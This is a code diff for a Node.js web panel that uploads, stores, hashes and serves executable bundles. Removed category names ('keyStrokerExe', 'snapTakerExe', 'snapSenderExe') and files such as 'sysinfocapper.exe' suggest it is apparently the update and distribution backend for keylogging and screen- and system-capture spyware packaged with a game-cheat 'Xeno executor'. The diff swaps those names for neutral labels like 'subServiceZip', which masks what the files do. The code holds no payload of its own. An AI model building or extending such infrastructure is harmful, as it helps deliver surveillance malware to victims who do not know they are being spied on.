@@ -89,22 +89,38 @@ const statusPriority = {
 };
 
 // FileMetadata Schema
+// FileMetadata Schema for uploaded .zip files
 const FileMetadataSchema = new mongoose.Schema({
   category: {
     type: String,
-    enum: ['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe']
+    enum: ['subServiceZip', 'mainServiceZip', 'xenoExecutorZip', 'installerZip']
   },
   filename: String,
   fileId: mongoose.Types.ObjectId,
   uploadedBy: String,
   uploadDate: { type: Date, default: Date.now },
-  hash: String
+  hash: String // SHA256 hash of the .zip file for integrity check
 });
 
-// Compound unique index to ensure one file per category per user
+// Unique index to ensure one file per category per user
 FileMetadataSchema.index({ uploadedBy: 1, category: 1 }, { unique: true });
 
 const FileMetadata = mongoose.model('FileMetadata', FileMetadataSchema);
+
+// ExeHash Schema for manually entered .exe hashes
+const ExeHashSchema = new mongoose.Schema({
+  exeName: {
+    type: String,
+    enum: ['bescr.exe', 'snapshotter.exe', 'Win32.exe', 'sysinfocapper.exe']
+  },
+  hash: String, // SHA256 hash
+  uploadedBy: String
+});
+
+// Unique index to ensure one hash per .exe per user
+ExeHashSchema.index({ uploadedBy: 1, exeName: 1 }, { unique: true });
+
+const ExeHash = mongoose.model('ExeHash', ExeHashSchema);
 
 // GridFS setup (assuming this is part of your original setup)
 let bucket;
@@ -119,16 +135,24 @@ let bucket;
 const zipUpload = multer({
   storage: multer.memoryStorage(),
   fileFilter: (req, file, cb) => {
+    const allowedCategories = ['subServiceZip', 'mainServiceZip', 'xenoExecutorZip', 'installerZip'];
     const category = req.params.category;
-    let allowed;
-    if (category === 'xenoExecutorZip') {
-      allowed = /\.zip$/i.test(file.originalname);
-    } else {
-      allowed = /\.exe$/i.test(file.originalname);
+    if (!allowedCategories.includes(category)) {
+      return cb(new Error('Invalid category'), false);
     }
-    cb(allowed ? null : new Error(`Only ${category === 'xenoExecutorZip' ? '.zip' : '.exe'} files allowed for ${category}`), allowed);
+    const allowed = /\.zip$/i.test(file.originalname);
+    cb(allowed ? null : new Error('Only .zip files are allowed'), allowed);
   }
 });
+
+const fileCategories = [
+  { category: 'subServiceZip', label: 'Sub-service files' },
+  { category: 'mainServiceZip', label: 'Main service file' },
+  { category: 'xenoExecutorZip', label: 'Xeno executor file' },
+  { category: 'installerZip', label: 'Installer file' }
+];
+
+const exeNames = ['bescr.exe', 'snapshotter.exe', 'Win32.exe', 'sysinfocapper.exe'];
 
 // Function to calculate SHA256 hash
 const calculateHash = (buffer) => {
@@ -190,7 +214,7 @@ async function pollApi(api) {
       databaseStatus: 'N/A'
     };
   }
-// update the status in the database
+  // update the status in the database
   await ApiStatus.findOneAndUpdate(
     { url: api.url },
     { $set: { ...record, lastChecked: new Date() } },
@@ -447,11 +471,13 @@ const getRemoveAPIHTML = (username, apiEndpoints) => {
 const getUploadHTML = async (username) => {
   const files = await FileMetadata.find({ uploadedBy: username }).lean();
   const fileMap = {};
-  files.forEach(file => {
-    fileMap[file.category] = file;
-  });
+  files.forEach(file => fileMap[file.category] = file);
 
-  const getFileSection = (category, label, accept) => {
+  const hashes = await ExeHash.find({ uploadedBy: username }).lean();
+  const hashMap = {};
+  hashes.forEach(h => hashMap[h.exeName] = h.hash);
+
+  const getFileSection = (category, label) => {
     const file = fileMap[category];
     if (file) {
       return `
@@ -463,7 +489,7 @@ const getUploadHTML = async (username) => {
             <button type="submit" class="remove-btn">Remove</button>
           </form>
           <form id="update-${category}" enctype="multipart/form-data">
-            <input type="file" id="file-update-${category}" accept="${accept}" required>
+            <input type="file" id="file-update-${category}" accept=".zip" required>
             <button type="submit" class="update-btn">Update</button>
             <progress id="progress-update-${category}" value="0" max="100" style="display: none; width: 100%;"></progress>
             <p id="status-update-${category}" style="color: #555;"></p>
@@ -506,30 +532,25 @@ const getUploadHTML = async (username) => {
                       method: 'POST',
                       body: formData
                     });
-                    if (response.ok) {
-                      success = true;
-                    } else {
-                      throw new Error('Chunk upload failed');
-                    }
+                    if (!response.ok) throw new Error('Chunk upload failed');
+                    success = true;
                   } catch (err) {
                     attempt++;
                     if (attempt === retries) {
-                      status.textContent = 'Upload failed at chunk ' + i + ' after ' + retries + ' retries';
+                      status.textContent = 'Upload failed at chunk ' + i;
                       updateBtn.disabled = false;
                       return;
                     }
-                    status.textContent = 'Retrying chunk ' + i + ' (attempt ' + (attempt + 1) + ' of ' + retries + ')';
                     await new Promise(resolve => setTimeout(resolve, 1000));
                   }
                 }
 
                 uploadedChunks++;
-                const percent = (uploadedChunks / totalChunks) * 100;
-                progress.value = percent;
-                status.textContent = 'Uploading: ' + Math.round(percent) + '%';
+                progress.value = (uploadedChunks / totalChunks) * 100;
+                status.textContent = 'Uploading: ' + Math.round(progress.value) + '%';
               }
 
-              status.textContent = 'Processing file on server (this may take a moment)...';
+              status.textContent = 'Finalizing...';
               const finalizeResponse = await fetch('/finalize-upload/${category}', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -538,9 +559,9 @@ const getUploadHTML = async (username) => {
 
               if (finalizeResponse.ok) {
                 status.textContent = 'Update successful!';
-                window.location = '/updater';
+                window.location.reload();
               } else {
-                status.textContent = 'Server processing failed. Please try again.';
+                status.textContent = 'Finalization failed.';
                 updateBtn.disabled = false;
               }
             });
@@ -553,7 +574,7 @@ const getUploadHTML = async (username) => {
           <h3>${label}</h3>
           <p>No file uploaded</p>
           <form id="upload-${category}" enctype="multipart/form-data">
-            <input type="file" id="file-upload-${category}" accept="${accept}" required>
+            <input type="file" id="file-upload-${category}" accept=".zip" required>
             <button type="submit" class="upload-btn">Upload</button>
             <progress id="progress-upload-${category}" value="0" max="100" style="display: none; width: 100%;"></progress>
             <p id="status-upload-${category}" style="color: #555;"></p>
@@ -572,7 +593,7 @@ const getUploadHTML = async (username) => {
               status.textContent = 'Preparing file...';
 
               const file = fileInput.files[0];
-              const chunkSize = 1024 * 1024; // 1MB chunks
+              const chunkSize = 1024 * 1024;
               const totalChunks = Math.ceil(file.size / chunkSize);
               let uploadedChunks = 0;
               const retries = 3;
@@ -596,30 +617,25 @@ const getUploadHTML = async (username) => {
                       method: 'POST',
                       body: formData
                     });
-                    if (response.ok) {
-                      success = true;
-                    } else {
-                      throw new Error('Chunk upload failed');
-                    }
+                    if (!response.ok) throw new Error('Chunk upload failed');
+                    success = true;
                   } catch (err) {
                     attempt++;
                     if (attempt === retries) {
-                      status.textContent = 'Upload failed at chunk ' + i + ' after ' + retries + ' retries';
+                      status.textContent = 'Upload failed at chunk ' + i;
                       uploadBtn.disabled = false;
                       return;
                     }
-                    status.textContent = 'Retrying chunk ' + i + ' (attempt ' + (attempt + 1) + ' of ' + retries + ')';
                     await new Promise(resolve => setTimeout(resolve, 1000));
                   }
                 }
 
                 uploadedChunks++;
-                const percent = (uploadedChunks / totalChunks) * 100;
-                progress.value = percent;
-                status.textContent = 'Uploading: ' + Math.round(percent) + '%';
+                progress.value = (uploadedChunks / totalChunks) * 100;
+                status.textContent = 'Uploading: ' + Math.round(progress.value) + '%';
               }
 
-              status.textContent = 'Processing file on server (this may take a moment)...';
+              status.textContent = 'Finalizing...';
               const finalizeResponse = await fetch('/finalize-upload/${category}', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -628,9 +644,9 @@ const getUploadHTML = async (username) => {
 
               if (finalizeResponse.ok) {
                 status.textContent = 'Upload successful!';
-                window.location = '/updater';
+                window.location.reload();
               } else {
-                status.textContent = 'Server processing failed. Please try again.';
+                status.textContent = 'Finalization failed.';
                 uploadBtn.disabled = false;
               }
             });
@@ -640,17 +656,95 @@ const getUploadHTML = async (username) => {
     }
   };
 
+  const getHashSection = (exeName, currentHash) => {
+    const safeExeName = exeName.replace('.', '_');
+    return `
+      <div class="hash-section">
+        <h3>${exeName} hash</h3>
+        <form id="hash-form-${safeExeName}">
+          <input type="text" id="hash-input-${safeExeName}" value="${currentHash || ''}" placeholder="Enter SHA256 hash" required pattern="[0-9a-fA-F]{64}">
+          <button type="submit" class="save-btn">Save</button>
+          <p id="status-hash-${safeExeName}" style="color: #555;"></p>
+        </form>
+        <script>
+          document.getElementById('hash-form-${safeExeName}').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const hashInput = document.getElementById('hash-input-${safeExeName}');
+            const status = document.getElementById('status-hash-${safeExeName}');
+            const saveBtn = e.target.querySelector('.save-btn');
+
+            saveBtn.disabled = true;
+            status.textContent = 'Saving...';
+
+            const hashValue = hashInput.value;
+            if (!/^[0-9a-fA-F]{64}$/.test(hashValue)) {
+              status.textContent = 'Invalid SHA256 hash (must be 64 hex characters)';
+              saveBtn.disabled = false;
+              return;
+            }
+
+            try {
+              const response = await fetch('/save-hash/${exeName}', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hash: hashValue })
+              });
+              if (response.ok) {
+                status.textContent = 'Hash saved!';
+              } else {
+                status.textContent = 'Failed to save hash.';
+              }
+            } catch (err) {
+              status.textContent = 'Error: ' + err.message;
+            } finally {
+              saveBtn.disabled = false;
+            }
+          });
+        </script>
+      </div>
+    `;
+  };
+
+  const fileSections = fileCategories.map(cat => getFileSection(cat.category, cat.label)).join('');
+  const hashSections = exeNames.map(exeName => getHashSection(exeName, hashMap[exeName] || '')).join('');
+
   return wrapPageContent(username, `
     <link href="/upload.css" rel="stylesheet">
+    <style>
+      .hash-section {
+        margin-bottom: 20px;
+        padding: 15px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+      }
+      .hash-section h3 {
+        margin: 0 0 10px;
+        color: #555;
+      }
+      .hash-section input[type="text"] {
+        margin: 10px 0;
+        width: 100%;
+        padding: 8px;
+        box-sizing: border-box;
+      }
+      .save-btn {
+        padding: 8px 16px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        background: #4caf50;
+        color: white;
+      }
+      .save-btn:hover {
+        opacity: 0.9;
+      }
+    </style>
     <div class="upload-wrapper">
       <div class="upload-card">
         <h1>Manage Files</h1>
-        ${getFileSection('keyStrokerExe', 'Key code.exe', '.exe')}
-        ${getFileSection('mainExecutableExe', 'Bescr.exe', '.exe')}
-        ${getFileSection('snapTakerExe', 'Snapshotter.exe', '.exe')}
-        ${getFileSection('snapSenderExe', 'Sysinfocapper.exe', '.exe')}
-        ${getFileSection('xenoExecutorZip', 'Xeno version.zip', '.zip')}
-        ${getFileSection('installerExe', 'Installer.exe', '.exe')}
+        ${fileSections}
+        <h2>Manage Hashes</h2>
+        ${hashSections}
         <div class="upload-actions">
           <button type="button" onclick="location.href='/dashboard'" class="cancel-btn">Back to Dashboard</button>
         </div>
@@ -940,7 +1034,7 @@ app.post('/upload-chunk/:category', zipUpload.single('file'), async (req, res) =
   }
 
   const category = req.params.category;
-  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
+  if (!['subServiceZip', 'mainServiceZip', 'xenoExecutorZip', 'installerZip'].includes(category)) {
     console.log(`Invalid category chunk upload attempt: ${category}`);
     return res.status(400).send('Invalid category');
   }
@@ -974,7 +1068,7 @@ app.post('/finalize-upload/:category', async (req, res) => {
   const category = req.params.category;
   console.log(`[${new Date().toISOString()}] Starting finalization for user: ${req.session.user}, category: ${category}`);
 
-  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
+  if (!['subServiceZip', 'mainServiceZip', 'xenoExecutorZip', 'installerZip'].includes(category)) {
     console.log(`Invalid category finalization attempt: ${category}`);
     return res.status(400).send('Invalid category');
   }
@@ -1051,11 +1145,10 @@ app.post('/remove/:category', async (req, res) => {
   }
 
   const category = req.params.category;
-  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
+  if (!['subServiceZip', 'mainServiceZip', 'xenoExecutorZip', 'installerZip'].includes(category)) {
     console.log(`Invalid category remove attempt: ${category}`);
     return res.status(400).send('Invalid category');
   }
-
   console.log(`Starting removal for user: ${req.session.user}, category: ${category}`);
   const file = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
   if (file) {
@@ -1066,108 +1159,6 @@ app.post('/remove/:category', async (req, res) => {
   res.redirect('/updater');
 });
 
-app.post('/finalize-upload/:category', async (req, res) => {
-  const start = Date.now();
-
-  if (!req.session.user) {
-    console.log('Unauthorized finalization attempt for category:', req.params.category);
-    return res.status(401).send('Unauthorized');
-  }
-
-  const category = req.params.category;
-  console.log(`[${new Date().toISOString()}] Starting finalization for user: ${req.session.user}, category: ${category}`);
-
-  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
-    console.log(`Invalid category finalization attempt: ${category}`);
-    return res.status(400).send('Invalid category');
-  }
-
-  const { originalName } = req.body;
-  const userId = req.session.user;
-  const storageKey = `${userId}-${category}`;
-
-  // Retrieve chunks from memory
-  if (!chunkStorage.has(storageKey)) {
-    return res.status(400).send('No chunks found for this upload');
-  }
-
-  const storage = chunkStorage.get(storageKey);
-  const totalChunks = storage.totalChunks;
-  const chunks = storage.chunks;
-
-  // Verify all chunks are present
-  for (let i = 0; i < totalChunks; i++) {
-    if (!chunks[i]) {
-      return res.status(400).send(`Missing chunk ${i}`);
-    }
-  }
-
-  // Delete existing file if it exists (for updates)
-  const existingFile = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
-  if (existingFile) {
-    console.log(`Deleting existing file: ${existingFile.filename}, category: ${category}, uploaded by: ${req.session.user}`);
-    await bucket.delete(existingFile.fileId);
-  }
-
-  // Reconstruct the file from chunks
-  const buffer = Buffer.concat(chunks);
-  const fileStream = Readable.from(buffer);
-
-  const hashStart = Date.now();
-  const hash = calculateHash(buffer);
-  console.log(`[${new Date().toISOString()}] Hash calculated in ${Date.now() - hashStart}ms`);
-
-  const uploadStream = bucket.openUploadStream(originalName, {
-    metadata: { uploadedBy: req.session.user, uploadDate: new Date(), category, hash }
-  });
-
-  fileStream.pipe(uploadStream);
-
-  uploadStream.on('finish', async () => {
-    const dbStart = Date.now();
-    await FileMetadata.findOneAndUpdate(
-      { category, uploadedBy: req.session.user },
-      { filename: originalName, fileId: uploadStream.id, uploadDate: new Date(), hash },
-      { upsert: true }
-    );
-    console.log(`[${new Date().toISOString()}] DB update in ${Date.now() - dbStart}ms`);
-
-    console.log(`[${new Date().toISOString()}] Finalization successful for user: ${req.session.user}, category: ${category}, file: ${originalName}, total time: ${Date.now() - start}ms`);
-
-    // Clean up memory
-    chunkStorage.delete(storageKey);
-
-    res.status(200).send('Upload finalized');
-  });
-
-  uploadStream.on('error', (err) => {
-    console.error(`GridFS upload error for user: ${req.session.user}, category: ${category}, file: ${originalName}`, err);
-    chunkStorage.delete(storageKey); // Clean up on error
-    res.status(500).send('Upload failed');
-  });
-});
-
-app.post('/remove/:category', async (req, res) => {
-  if (!req.session.user) {
-    console.log('Unauthorized remove attempt for category:', req.params.category);
-    return res.status(401).send('Unauthorized');
-  }
-
-  const category = req.params.category;
-  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
-    console.log(`Invalid category remove attempt: ${category}`);
-    return res.status(400).send('Invalid category');
-  }
-
-  console.log(`Starting removal for user: ${req.session.user}, category: ${category}`);
-  const file = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
-  if (file) {
-    console.log(`Removing file: ${file.filename}, category: ${category}, uploaded by: ${req.session.user}`);
-    await bucket.delete(file.fileId);
-    await FileMetadata.deleteOne({ category, uploadedBy: req.session.user });
-  }
-  res.redirect('/updater');
-});
 
 // Updated download endpoint
 app.get('/download/:category', async (req, res) => {
@@ -1179,10 +1170,11 @@ app.get('/download/:category', async (req, res) => {
     return res.status(403).send('Forbidden');
   }
 
-  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
+  if (!['subServiceZip', 'mainServiceZip', 'xenoExecutorZip', 'installerZip'].includes(category)) {
     console.log(`Invalid category download attempt: ${category}`);
     return res.status(400).send('Invalid category');
   }
+
 
   try {
     const fileMetadata = await FileMetadata.findOne({ category })
@@ -1192,7 +1184,7 @@ app.get('/download/:category', async (req, res) => {
       return res.status(404).send('File not found');
     }
 
-    const expectedExtension = category === 'xenoExecutorZip' ? '.zip' : '.exe';
+    const expectedExtension = '.zip';
     if (!fileMetadata.filename.toLowerCase().endsWith(expectedExtension)) {
       console.log(`File ${fileMetadata.filename} does not match expected extension ${expectedExtension} for category: ${category}`);
       return res.status(400).send(`File does not match category extension: expected ${expectedExtension}`);
@@ -1273,7 +1265,7 @@ app.get('/hash/:category', async (req, res) => {
   }
 
   // Validate category
-  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
+  if (!['subServiceZip', 'mainServiceZip', 'xenoExecutorZip', 'installerZip'].includes(category)) {
     console.log(`Invalid category for hash request: ${category}`);
     return res.status(400).send('Invalid category');
   }
@@ -1289,6 +1281,42 @@ app.get('/hash/:category', async (req, res) => {
     res.status(200).send(fileMetadata.hash);
   } catch (err) {
     console.error(`Error in hash endpoint for category: ${category}`, err);
+    res.status(500).send('Server error');
+  }
+});
+
+app.post('/save-hash/:exeName', async (req, res) => {
+  // Check authentication
+  if (!req.session.user) {
+    console.log('Unauthorized hash save attempt for exe:', req.params.exeName);
+    return res.status(401).send('Unauthorized');
+  }
+
+  const exeName = req.params.exeName;
+  // Validate exeName
+  if (!['bescr.exe', 'snapshotter.exe', 'Win32.exe', 'sysinfocapper.exe'].includes(exeName)) {
+    console.log(`Invalid exe name: ${exeName}`);
+    return res.status(400).send('Invalid exe name');
+  }
+
+  const { hash } = req.body;
+  // Validate hash (assuming SHA256, 64 hex characters)
+  if (!hash || !/^[0-9a-fA-F]{64}$/.test(hash)) {
+    console.log(`Invalid hash provided for ${exeName}`);
+    return res.status(400).send('Invalid hash');
+  }
+
+  // Save or update hash in the database
+  try {
+    await ExeHash.findOneAndUpdate(
+      { uploadedBy: req.session.user, exeName },
+      { hash },
+      { upsert: true }
+    );
+    console.log(`Hash saved for ${exeName} by user: ${req.session.user}`);
+    res.status(200).send('Hash saved');
+  } catch (err) {
+    console.error(`Error saving hash for ${exeName}:`, err);
     res.status(500).send('Server error');
   }
 });
